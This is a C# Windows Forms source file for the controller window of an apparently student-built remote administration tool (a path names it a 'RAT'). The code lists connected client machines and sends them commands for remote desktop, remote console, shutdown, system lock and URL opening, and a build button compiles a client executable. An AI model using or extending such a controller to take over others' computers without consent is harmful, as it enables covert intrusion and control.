#region

using System;
using System.ComponentModel;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Common.Lib;
using MisComponentes;
using Servidor.DB;
using Servidor.Negocio;
using Servidor.Negocioo;

#endregion

namespace Servidor.UI
{
    public partial class VPpal : Form
    {
        public delegate void _AddClient(Conexion client, NetData info);

        //delegado que se ejecuta al conectarse un  cliente
        public delegate void _DesconectarClient(Conexion client);

        //delegado que se ejecuta al desconectarse un cliente

        public Conexion ClienteSeleccionado; //cliente sobre el que se va a trabajar.
        public Servidor MiServer; //instancia del servidor.

        public VConsolaRemota VentanaConsolaRemota;
        public VInfoVentanas VentanaInfoVentanas;
        public VInfoSoftware VentanaInfoSoftware;
        public VInfoProcesos VentanaInfoProcesos;

        public VPpal()
        {
            MiServer = new Servidor(this);
            ClienteSeleccionado = null;
            Thread.CurrentThread.CurrentUICulture = new CultureInfo(CRatIniPropiedades.Idioma);            
            InitializeComponent();
            ActivarIdioma();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            try
            {
                MiServer.Port = int.Parse(textPuertoEsc.Text);
                MiServer.IniciarEscuchaDefaultPort();
                txtEstado.ForeColor = Color.FromKnownColor(KnownColor.Green);
                loadlabel.Visible = true;
                txtEstado.Text = @"Escuchando en el puerto " + MiServer.Port;
                listGridClientes.Enabled = true;
                button1.Enabled = false;
                btnStop.Enabled = true;
            }
            catch (Exception ex)
            {
                txtEstado.ForeColor = Color.FromKnownColor(KnownColor.Red);
                txtEstado.Text = @"Error: " + ex.Message;
                loadlabel.Visible = false;
            }
        }

        public void AddNuevoCliente(Conexion client, NetData info)
        {
            if (info == null)
                return;
            try
            {
                ManejoDB.InsertarFromNetData(client.IpAddress, info); //insercion asyncrona en db.
            }
            catch (Exception ex)
            {
            }
            foreach (ListViewItem it in listGridClientes.Items)
            {
                if (it.Text == client.IpAddress)
                {
                    it.Tag = client;
                    if (it.SubItems[6].Text != "Conectado")
                    {
                        if (info.GetDato("TienePassword") == "True")
                        {
                            it.SubItems[6].Text = "Conectado sin Autentificar";
                            it.SubItems[6].ForeColor = Color.RoyalBlue;
                        }
                        else
                        {
                            it.SubItems[6].Text = "Conectado";
                            it.SubItems[6].ForeColor = Color.Green;
                        }
                    }
                    iconoDeNotificacion.ShowBalloonTip(300, "Reconexion",
                                                       "El cliente" + client.IpAddress + " volvio a conectarse.",
                                                       ToolTipIcon.Info);
                    return;
                }
            }
            //si no esta en la lista lo añado con los datos que envió.            
            ListViewItem item = new ListViewItem();
            item = new ListViewItem();

            item.UseItemStyleForSubItems = true;
            item.Text = client.IpAddress;
            item.Tag = client;


            item.SubItems.Add("UsuarioLogeado");
            item.SubItems.Add("NombrePc");
            item.SubItems.Add("Plataforma");
            item.SubItems.Add("Version");
            item.SubItems.Add("Idioma");
            item.SubItems.Add("Estado");

            item.SubItems[1].Text = info.GetDato("UsuarioLogeado");
            item.SubItems[2].Text = info.GetDato("NombrePc");
            item.SubItems[3].Text = info.GetDato("NombreSo");
            item.SubItems[4].Text = info.GetDato("VersionSo");
            item.SubItems[5].Text = info.GetDato("IdiomaSo");

            if (info.GetDato("TienePassword") == "True")
            {
                item.SubItems[6].Text = "Conectado sin Autentificar";
                item.SubItems[6].ForeColor = Color.RoyalBlue;
            }
            else
            {
                item.SubItems[6].Text = "Conectado";
                item.SubItems[6].ForeColor = Color.Green;
            }

            item.UseItemStyleForSubItems = false;
            MiServer.Online++;
            listGridClientes.Items.Add(item);
            iconoDeNotificacion.ShowBalloonTip(150, "Nuevo cliente",
                                               "Se conecto un nuevo cliente con la IP " + client.IpAddress + " .",
                                               ToolTipIcon.Info);
        }

        public void DesconectarClient(Conexion client)
        {
            foreach (ListViewItem item  in listGridClientes.Items)
            {
                if (item.Text == client.IpAddress)
                {
                    item.SubItems[6].ForeColor = Color.Red;
                    item.SubItems[6].Text = "No Conectado";
                    iconoDeNotificacion.ShowBalloonTip(150, "Cliente Desconectado",
                                                       "El cliente " + client.IpAddress + " se desconecto.",
                                                       ToolTipIcon.Error);
                }
            }
            MiServer.Online--;
            if (client == ClienteSeleccionado)
                ClienteSeleccionado = null;
        }

        private void VPpal_FormClosed(object sender, FormClosedEventArgs e)
        {
            MiServer.PararEscucha();
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            try
            {
                foreach (ListViewItem item in listGridClientes.Items)
                {
                    try
                    {
                        Conexion cliente = (Conexion) item.Tag;
                        cliente.ClientNetworkStream.Close();
                    }
                    catch (Exception)
                    {
                    }
                }
                txtEstado.ForeColor = Color.FromKnownColor(KnownColor.Red);
                txtEstado.Text = "Estado : Parado";
                loadlabel.Visible = false;
                listGridClientes.Enabled = false;
                listGridClientes.Items.Clear();
                btnStop.Enabled = false;
                button1.Enabled = true;
                MiServer.PararEscucha();
            }
            catch (Exception)
            {
            }
        }

        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (listGridClientes.SelectedItems.Count <= 0)
            {
                ClienteSeleccionado = null;
                return;
            }
            if (listGridClientes.SelectedItems[0].SubItems[6].Text == "No Conectado")
            {
                ClienteSeleccionado = null;
                return;
            }
            ClienteSeleccionado = (Conexion) listGridClientes.SelectedItems[0].Tag;
        }

        private void VPpal_Load(object sender, EventArgs e)
        {
        }

        private void btnBuild_Click(object sender, EventArgs e)
        {
            using (SaveFileDialog sfd = new SaveFileDialog())
            {
                sfd.Filter = "Executables |*.exe";
                if (sfd.ShowDialog() == DialogResult.OK)
                {
                    String cod;
                    StreamReader sr =
                        new StreamReader(
                            @"C:\Users\jjx001\Desktop\Proyecto RAT\4.Construccion\Servidor\Servidor.UI\Resources\codigoCliente.txt");
                    cod = sr.ReadToEnd();

                    bool res = Compilador.Compilar(sfd.FileName, cod);
                    if (res)
                        MessageBox.Show("Cliente Generado.", "Compilacion", MessageBoxButtons.OK,
                                        MessageBoxIcon.Information);
                    else
                    {
                        MessageBox.Show("algo fue mal...", "Compilacion", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
            }
        }

        /*   private void btnSendMsg_Click(object sender, EventArgs e)
        {
            String ei = MisComponentes.MiInputBox.PedirString("Introduzca un titulo", "¿Qué nuevo titulo deseas para la/s ventana/s seccionada/s?", this);
            this.btnSendMsg.Text = ei;
        }*/

        private void groupBox1_Enter(object sender, EventArgs e)
        {
        }

        private void button6_Click(object sender, EventArgs e)
        {
        }

        private void groupBox2_Enter(object sender, EventArgs e)
        {
        }

        private void groupBox5_Enter(object sender, EventArgs e)
        {
        }

        private void statusStrip1_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
        {
        }

        private void aboutToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            new AboutBox().ShowDialog();
        }

        private void button17_Click(object sender, EventArgs e)
        {
            if (button17.Tag == "mostrar")
            {
                button17.Text = "Ocultar Acciones";
                button17.Tag = "ocultar";
                Size = new Size(Size.Width, 555);
            }
            else
            {
                button17.Text = "Mostrar Acciones";
                button17.Tag = "mostrar";
                Size = new Size(Size.Width, 290);
            }
        }

        private void eventoBtnInfoVentanasClick(object sender, EventArgs e)
        {
            if (ClienteSeleccionado != null)
            {
                VentanaInfoVentanas = new VInfoVentanas(ClienteSeleccionado);
                VentanaInfoVentanas.ShowDialog(this);
            }
        }

        private void opcionesToolStripMenuItem_Click(object sender, EventArgs e)
        {
        }

        private void officeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            LookAndFeel.SkinFile = @"temas\MacOS.ssk";
        }

        private void defaultToolStripMenuItem_Click(object sender, EventArgs e)
        {
        }

        private void mSNToolStripMenuItem_Click(object sender, EventArgs e)
        {
            LookAndFeel.SkinFile = @"temas\MSN.ssk";
        }

        private void eventoBtnEnviarMsgBoxClick(object sender, EventArgs e)
        {
            if (ClienteSeleccionado != null)
            {
                String[] datosMsgBox = MsgBoxBuilder.obtenerMsgBoxDataInfo("" + ClienteSeleccionado.IpAddress);
                if (datosMsgBox != null)
                {
                    NetData envioMsgBox = new NetData((int) Protocolo.Servidor.MostrarMsgBox);
                    envioMsgBox.AddDato("Msg", datosMsgBox[0]);
                    envioMsgBox.AddDato("Titulo", datosMsgBox[1]);
                    envioMsgBox.AddDato("Tipo", datosMsgBox[2]);

                    ClienteSeleccionado.Enviar(envioMsgBox);
                }
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (ClienteSeleccionado != null)
            {
                VentanaInfoSoftware = new VInfoSoftware(ClienteSeleccionado);
                VentanaInfoSoftware.ShowDialog(this);
            }
        }


        private void eventoBtnEscritorioRemotoClick(object sender, EventArgs e)
        {
            if (ClienteSeleccionado != null)
            {
                try
                {
                    NetData escRemoto = new NetData((int) Protocolo.Servidor.IniciarEscritorioRemoto);
                    ClienteSeleccionado.Enviar(escRemoto);
                    Thread.Sleep(300);
                    FormEscritorioRemoto.AbrirFormEscritorioRemoto("" + ClienteSeleccionado.IpAddress,
                                                                   9999,true);
                }
                catch (Exception ex)
                {
                }
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            if (ClienteSeleccionado != null)
            {
                VentanaInfoProcesos = new VInfoProcesos(ClienteSeleccionado);
                VentanaInfoProcesos.ShowDialog(this);
            }
        }

        private void button5_Click(object sender, EventArgs e)
        {
        }

        private void eventoBtnBloquearSistemaClick(object sender, EventArgs e)
        {
            if (ClienteSeleccionado != null)
            {
                ClienteSeleccionado.Enviar(new NetData((int) Protocolo.Servidor.BloquearSistema));
            }
        }

        private void eventoBtnDesbloquearSistemaClick(object sender, EventArgs e)
        {
            if (ClienteSeleccionado != null)
            {
                ClienteSeleccionado.Enviar(new NetData((int) Protocolo.Servidor.DesbloquearSistema));
            }
        }

        private void button13_Click(object sender, EventArgs e)
        {
            if (ClienteSeleccionado != null)
            {
                VentanaConsolaRemota = new VConsolaRemota(ClienteSeleccionado);
                VentanaConsolaRemota.Visible = true;
            }
        }

        private void eventoBotonApagado(object sender, EventArgs e)
        {
            try
            {
                if (ClienteSeleccionado != null)
                {
                    NetData ndShutdown = new NetData((int) Protocolo.Servidor.ApagarEquipo);
                    if (sender.GetType() == typeof (Button))
                    {
                        Button btnPulsado = sender as Button;
                        ndShutdown.AddDato("Flag", btnPulsado.Tag.ToString());
                        ClienteSeleccionado.Enviar(ndShutdown);
                    }
                    else if (sender.GetType() == typeof (ToolStripMenuItem))
                    {
                        ToolStripMenuItem btnPulsado = sender as ToolStripMenuItem;
                        ndShutdown.AddDato("Flag", btnPulsado.Tag.ToString());
                        ClienteSeleccionado.Enviar(ndShutdown);
                    }
                }
                else
                {
                    MessageBox.Show("Selecciona un cliente destino para la acción");
                }
            }
            catch (Exception ex)
            {
            }
        }

        private void eventoBotonEnviarWebClick(object sender, EventArgs e)
        {
            if (ClienteSeleccionado != null)
            {
                String url = MiInputBox.PedirString("Escribe una url",
                                                    "Introduce la url que deseas enviar al cliente.",
                                                    this);
                if (url == null) return;
                if (Utils.ValidarUrl(url))
                {
                    NetData urlInfo = new NetData((int) Protocolo.Servidor.AbrirPaginaWeb);
                    urlInfo.AddDato("URL", url);
                    ClienteSeleccionado.Enviar(urlInfo);
                }
                else
                {
                    MessageBox.Show("La url proporcionada no es una Url bien formada. Escriba una url correcta.",
                                    "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }
            }
        }

        private void button16_Click(object sender, EventArgs e)
        {
        }

        private void eventoBtnDesconectarClienteClick(object sender, EventArgs e)
        {
            if (ClienteSeleccionado != null)
            {
                if (
                    MessageBox.Show(
                        "Una vez desconectes el cliente, no podrás volver a conectar con el hasta que vuelva a ser ejecutado.\n¿Estas seguro que deseas desconectar el cliente?",
                        "Confirmar Desconexion", MessageBoxButtons.YesNo) == DialogResult.Yes)
                {
                    ClienteSeleccionado.Enviar((new NetData((int) Protocolo.Servidor.DesconectarCliente)));
                }
            }
        }


        private void verLogDeEventosToolStripMenuItem_Click(object sender, EventArgs e)
        {
            
            Color auxColor = this.txtEstado.ForeColor;
            String auxText = this.txtEstado.Text;
            BackgroundWorker bw = new BackgroundWorker();
            this.txtEstado.ForeColor = Color.DodgerBlue;
            this.txtEstado.Text = "Se está recopilando la informacion, espere unos segundos...";
            this.Refresh();
            new VisorDeEventos().ShowDialog();
            this.txtEstado.Text = auxText;
            this.txtEstado.ForeColor = auxColor;            
        }

        
        private void listGridClientes_MouseClick(object sender, MouseEventArgs e)
        {
            ListView miLista = sender as ListView;
            if (e.Button == MouseButtons.Right)
            {
                ListViewItem item = miLista.GetItemAt(e.X, e.Y);
                if (item != null)
                {
                    item.Selected = true;
                    if (item.SubItems[6].Text == "Conectado sin Autentificar")
                    {
                        contextMenuClienteListBox.Enabled = true;
                        foreach (ToolStripMenuItem menuItem in contextMenuClienteListBox.Items)
                        {
                            if (menuItem != contextMenuClienteListBox.Items[0]) //deshabilito todos menos autentificar
                                menuItem.Enabled = false;
                        }
                    }
                    else if (item.SubItems[6].Text == "Conectado")
                    {
                        contextMenuClienteListBox.Enabled = true;
                        foreach (ToolStripMenuItem menuItem in contextMenuClienteListBox.Items)
                        {
                            menuItem.Enabled = true;
                            contextMenuClienteListBox.Items[0].Enabled = false;
                        }
                    }
                    else
                    {
                        contextMenuClienteListBox.Enabled = false;
                    }
                    contextMenuClienteListBox.Show(miLista, e.Location);
                }
            }
        }

        private void contextMenuClienteListBox_Opening(object sender, CancelEventArgs e)
        {
            if (listGridClientes.SelectedItems.Count <= 0)
            {
                e.Cancel = true;
            }
        }

        private void autentificarToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ClienteSeleccionado != null)
            {
                string pass = MiInputBox.PedirString("Autentificación",
                                                     "Introduce la contraseña para el cliente.", this);
                if (!string.IsNullOrEmpty(pass))
                {
                    NetData msgPass = new NetData((int) Protocolo.Servidor.EnviarPassword);
                    msgPass.AddDato("Password", pass);
                    ClienteSeleccionado.Enviar(msgPass);
                }
            }
        }

        public void AutentificarCliente(Conexion cliente)
        {
            foreach (ListViewItem it in listGridClientes.Items)
            {
                if (cliente == it.Tag)
                {
                    it.SubItems[6].Text = "Conectado";
                    it.SubItems[6].ForeColor = Color.Green;
                }
            }
        }

        private void spanishToolStripMenuItem_Click(object sender, EventArgs e)
        {
            CRatIniPropiedades.Idioma = "es";
            MessageBox.Show("The lenguage will change when you reboot the aplication.");
        }

        private void englishToolStripMenuItem_Click(object sender, EventArgs e)
        {
            CRatIniPropiedades.Idioma = "en";
            MessageBox.Show("El idioma se cambiará la proxima vez que abras la aplicación.");
        }

        private void ActivarIdioma()
        {
            if (DB.CRatIniPropiedades.Idioma == "en")
                englishToolStripMenuItem.Enabled = false;
            else
                spanishToolStripMenuItem.Enabled = false;
        }
    }
}